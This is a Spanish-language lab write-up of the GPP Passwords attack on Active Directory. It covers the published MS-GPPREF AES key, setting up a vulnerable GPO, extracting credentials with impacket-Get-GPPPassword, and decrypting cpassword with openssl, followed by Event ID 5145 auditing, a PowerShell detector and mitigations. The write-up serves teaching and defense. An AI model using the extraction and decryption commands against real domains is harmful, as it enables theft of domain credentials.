# GPP Passwords

> ⚠️ Fines educativos, laboratorio aislado — ver disclaimer completo en el [README](../README.md).

## ¿Qué es este ataque?

GPP Passwords explota una vulnerabilidad histórica de las **Group Policy Preferences** (Preferencias de Directiva de Grupo), una función de Windows que permite a los administradores configurar elementos como cuentas locales, tareas programadas, unidades de red o servicios **directamente desde una GPO**, lo que pasa es que antes incluian credenciales.

Esas credenciales se almacenaban cifradas con AES-256 dentro de un archivo XML en SYSVOL. El problema es que Microsoft publicó (aunque suene sorprendente, sí, lo hizo) la clave de cifrado en su propia documentación pública del protocolo (MS-GPPREF), haciendo que cualquier usuario autenticado en el dominio pudiera leer y descifrar esas contraseñas en segundos.

```
Admin crea una tarea programada que se ejecuta como "pedri"
y guarda su contraseña en la GPO
    ↓
Windows almacena esa contraseña cifrada (cpassword) en un XML
dentro de SYSVOL (recurso compartido de lectura para todo el dominio)
    ↓
Microsoft publicó la clave AES de cifrado en su documentación oficial
    ↓
Cualquier usuario del dominio puede leer ese XML en \\DC01\SYSVOL\adlab.local\Policies\
    ↓
Descifra la contraseña con la clave pública conocida
```

---

## ¿Por qué existe esta vulnerabilidad?

El fallo nace de una contradicción de diseño: para que el **cliente** Windows pudiera descifrar la contraseña y usarla, necesitaba conocer la clave de cifrado. El problema es que esa clave es **simétrica** (la misma para cifrar y descifrar) y Microsoft la publicó en su propia documentación pública — lo que significa que cualquier usuario del dominio puede leer el XML con la contraseña cifrada en `\\DC01\SYSVOL\adlab.local\Policies\{GUID}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml` y descifrarla con la clave conocida. Tienes el resultado cifrado y la llave: no hay secreto.

> *"All passwords are encrypted using a derived Advanced Encryption Standard (AES) key. The 32-byte AES key is as follows: `4e 99 06 e8 fc b6 6c c9 fa f4 93 10 62 0f fe e8 f4 96 e8 06 cc 05 79 90 20 9b 09 a4 33 b6 6c 1b`"*
>
> — [MS-GPPREF 2.2.1.1.4 Password Encryption — Microsoft Learn](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be)

![Clave AES de 32 bytes publicada por Microsoft en la documentación oficial MS-GPPREF](<img/Captura de pantalla 2026-06-30 164313.png>)


Microsoft lo corrigió en mayo de 2014 con el boletín **MS14-025**, que elimina la posibilidad de **crear** nuevas contraseñas mediante GPP desde la consola de administración. Sin embargo, el parche:

- No elimina los archivos XML con contraseñas ya existentes en SYSVOL.
- No afecta a GPOs creadas o editadas manualmente (como demostraremos en este laboratorio).

Por eso, si nunca limpiaste las configuraciones ahí siguen y realmente en 12 años aún es posible encontrarlas en algunos entornos.

---

## Entorno de laboratorio

| Máquina | Rol | IP |
|---------|-----|----|
| DC01 | Controlador de dominio (víctima) | 100.100.100.50 |
| Kali | Atacante (con credenciales de dominio) | 100.100.100.20 |

Cuenta atacante: `lamine` (usuario de dominio sin privilegios especiales)
Cuenta objetivo: `pedri` (credenciales expuestas en la GPO)

---

## Configurar la vulnerabilidad

**Contexto:** Se trata de hacer un lab vulnerable y lo primero que tenemos que saber es que Windows Server 2022 ya no permite crear contraseñas GPP nuevas desde la GUI moderna de Administración de directivas de grupo (efecto del parche MS14-025 aplicado también a las herramientas de administración). Al crear una tarea programada con credenciales, Windows usa por defecto `logonType="S4U"`, un modo que **no almacena contraseña**.

![Creación de la GPO "Configuracion-Equipos-Local" en Administración de directivas de grupo](<img/Captura de pantalla 2026-06-30 162005.png>)

![Añadiendo una nueva tarea programada en Preferencias de la GPO](<img/Captura de pantalla 2026-06-30 162334.png>)

![Configuración de la tarea BackupDiario para ejecutarse como ADLAB\pedri](<img/Captura de pantalla 2026-06-30 162737.png>)

Entonces, para reproducir fielmente el escenario histórico vulnerable (organizaciones con GPOs anteriores a 2014, o plantillas migradas de versiones antiguas), edito manualmente el XML generado, cambiando:

```xml
<!-- Generado por la GUI moderna (no vulnerable) -->
<Properties name="BackupDiario" logonType="S4U" runAs="ADLAB\pedri" action="U">
```

por:

```xml
<!-- Forzado al modo histórico vulnerable -->
<Properties name="BackupDiario" logonType="Password"
            cpassword="VPe/o9YRyz2cksnYRbNeQoC7S+/HhWsGEcuvup04p1E"
            runAs="ADLAB\pedri" action="U">
```

El valor de `cpassword` se genera cifrando la contraseña en texto claro (`Password123!`) con AES-256-CBC, IV nulo, y la clave pública de Microsoft, el mismo proceso que hacía la GUI antigua de forma automática.

El archivo final se coloca en:

```
C:\Windows\SYSVOL\domain\Policies\{GUID-de-la-GPO}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
```

![XML de ScheduledTasks en SYSVOL con el atributo cpassword y logonType="Password"](<img/Captura de pantalla 2026-06-30 164121.png>)

---

## Ataque desde Kali

Teniendo acceso a cualquier cuenta dentro del dominio, basta con consultar SYSVOL:

```bash
impacket-Get-GPPPassword -no-pass 'adlab.local/lamine:Password123!@100.100.100.50'
```

Resultado:

```
[*] Listing shares ...
  - ADMIN$
  - C$
  - IPC$
  - NETLOGON
  - SYSVOL

[*] Searching *.xml files ...
[*] Found a ScheduledTasks XML file:
[*] file     : \\adlab.local\Policies\{GUID}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
[*] name     : BackupDiario
[*] runAs    : ADLAB\pedri
[*] password : Password123!
[*] changed  : 2026-06-30 14:30:42
```

![impacket-Get-GPPPassword extrae y descifra la contraseña de ADLAB\pedri desde SYSVOL](<img/Captura de pantalla 2026-06-30 164953.png>)

La herramienta automatiza el proceso: localiza el recurso compartido, busca todos los XML de `Preferences`, extrae el atributo `cpassword` y lo descifra con la clave pública de Microsoft.

**Descifrado manual (referencia):**

```bash
echo 'VPe/o9YRyz2cksnYRbNeQoC7S+/HhWsGEcuvup04p1E' | base64 -d | \
openssl enc -d -aes-256-cbc \
  -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b \
  -iv 00000000000000000000000000000000 | iconv -f UTF-16LE -t UTF-8
```

---

## Evidencia en los logs del DC

A diferencia de los ataques contra Kerberos (AS-REProasting, Kerberoasting), GPP Passwords **no genera ningún evento de autenticación especial**, debido a que  simplemente se lee un archivo compartido, una operación que a priori es legitima, no podemos generar un evento cada vez que consultamos un archivo compartido en un dominio.

Debido a esto, para poder detectar este ataque, primero hay que habilitar explícitamente la generación de estos eventos.

1. **Directiva de auditoría avanzada** en la GPO de Controladores de Dominio:

```
Default Domain Controllers Policy → Editar
→ Configuración del equipo → Directivas → Configuración de Windows
  → Configuración de seguridad → Configuración de directiva de auditoría avanzada
    → Acceso a objetos
      → "Auditar sistema de archivos" → Correcto
      → "Auditar recurso compartido de archivos detallado" → Correcto
```

![Directiva de auditoría avanzada en el DC — Acceso a objetos con "Auditar sistema de archivos: Aciertos"](<img/implementamos la gpo.png>)

2. **SACL (System Access Control List)** en la carpeta SYSVOL:

```
C:\Windows\SYSVOL\domain → Propiedades → Seguridad → Opciones avanzadas
→ Pestaña Auditoría → Agregar
  → Entidad de seguridad: Todos
  → Tipo: Correcto
  → Se aplica a: Esta carpeta, subcarpetas y archivos
  → Permisos: Control total (para fines de laboratorio)
```

![SACL configurada en SYSVOL: Todos / Correcto / Esta carpeta, subcarpetas y archivos](<img/hacemos que la carpeta este monitoriza.png>)

Una vez habilitado, el ataque genera evidencia en:

```
Registro: Security
Event ID: 5145 — Se comprobó un objeto de recurso compartido de red 
                  para averiguar si se puede conceder el acceso deseado
```

Datos relevantes del evento capturado:

```
Cuenta:            ADLAB\lamine
Dirección origen:  100.100.100.20  (IP de Kali)
Recurso:           \\*\SYSVOL
Ruta relativa:     adlab.local\Policies\{GUID}\Machine\Preferences\ScheduledTasks\...
Accesos:           ReadData (o ListDirectory), ReadAttributes
Resultado:         Concedido
```

![Event ID 5145 en el Visor de eventos del DC01 — acceso de ADLAB\lamine a SYSVOL desde 100.100.100.20](<img/Captura de pantalla 2026-06-30 170908.png>)

**El reto de la detección:** este evento por sí solo es ambiguo, ya que leer SYSVOL es tráfico normal y constante de cualquier cliente del dominio aplicando políticas. La señal distintiva no está en el evento en sí, sino en **qué ruta concreta se accedió**: las subcarpetas `ScheduledTasks`, `Groups`, `Services`, `Drives`, `DataSources` o `Printers` dentro de `Preferences` son donde históricamente vivían los XML con `cpassword`, y un cliente normal aplicando GPOs no suele navegar directamente a esas rutas de forma explícita.

---

## Detección con PowerShell

```powershell
function Get-GPPPasswordAttempts {
    param(
        [int]$HorasAtras = 24
    )

    $tiempo = (Get-Date).AddHours(-$HorasAtras)

    # Subcarpetas de Preferences donde GPP guardaba credenciales
    $rutasSospechosas = @(
        'ScheduledTasks', 'Groups', 'Services',
        'Drives', 'DataSources', 'Printers'
    )

    $eventos = Get-WinEvent -FilterHashtable @{
        LogName   = 'Security'
        Id        = 5145
        StartTime = $tiempo
    } -ErrorAction SilentlyContinue

    $alertas = @()

    foreach ($evento in $eventos) {
        $xml   = [xml]$evento.ToXml()
        $datos = $xml.Event.EventData.Data

        $cuenta       = ($datos | Where-Object { $_.Name -eq 'SubjectUserName' }).'#text'
        $ipOrigen     = ($datos | Where-Object { $_.Name -eq 'IpAddress' }).'#text'
        $recurso      = ($datos | Where-Object { $_.Name -eq 'ShareName' }).'#text'
        $rutaRelativa = ($datos | Where-Object { $_.Name -eq 'RelativeTargetName' }).'#text'

        if ($recurso -notlike '*SYSVOL*') { continue }

        $coincide = $false
        foreach ($ruta in $rutasSospechosas) {
            if ($rutaRelativa -like "*\$ruta\*" -or $rutaRelativa -like "*\$ruta") {
                $coincide = $true
                break
            }
        }

        if ($coincide) {
            $alertas += [PSCustomObject]@{
                Fecha     = $evento.TimeCreated
                Cuenta    = $cuenta
                IPOrigen  = $ipOrigen
                Recurso   = $recurso
                Ruta      = $rutaRelativa
                Severidad = 'MEDIA'
                Ataque    = 'GPP Passwords'
            }
        }
    }

    return $alertas
}
```

> **Nota sobre severidad:** a diferencia de los ataques Kerberos donde un solo evento ya es prueba casi definitiva, aquí marco la severidad como **MEDIA** porque un administrador legítimo gestionando GPOs también puede generar este mismo patrón de acceso. Se recomienda correlacionar con el origen (¿es una IP/equipo que normalmente administra GPOs?) y con el volumen de accesos.

---

## Mitigación

1. **Auditar y eliminar** cualquier XML con `cpassword` existente en SYSVOL:

```powershell
Get-ChildItem -Path "\\adlab.local\SYSVOL\adlab.local\Policies" -Recurse -Include *.xml |
    Select-String -Pattern "cpassword" | Select-Object Path
```

2. **Verificar que MS14-025 está instalado** en todos los equipos desde los que se administran GPOs (RSAT).

3. **Nunca usar GPP para almacenar credenciales.** Alternativas seguras:
   - **LAPS (Local Administrator Password Solution)** para contraseñas de administrador local, con rotación automática.
   - **Group Managed Service Accounts (gMSA)** para cuentas de servicio en tareas programadas.

4. **Monitorizar el Event ID 5145** sobre SYSVOL filtrando por las rutas de `Preferences`, como hace el script de detección, prestando especial atención a accesos desde cuentas o equipos que no gestionan habitualmente GPOs.

---

## Archivos

- [`detection.ps1`](detection.ps1) — Módulo de detección PowerShell
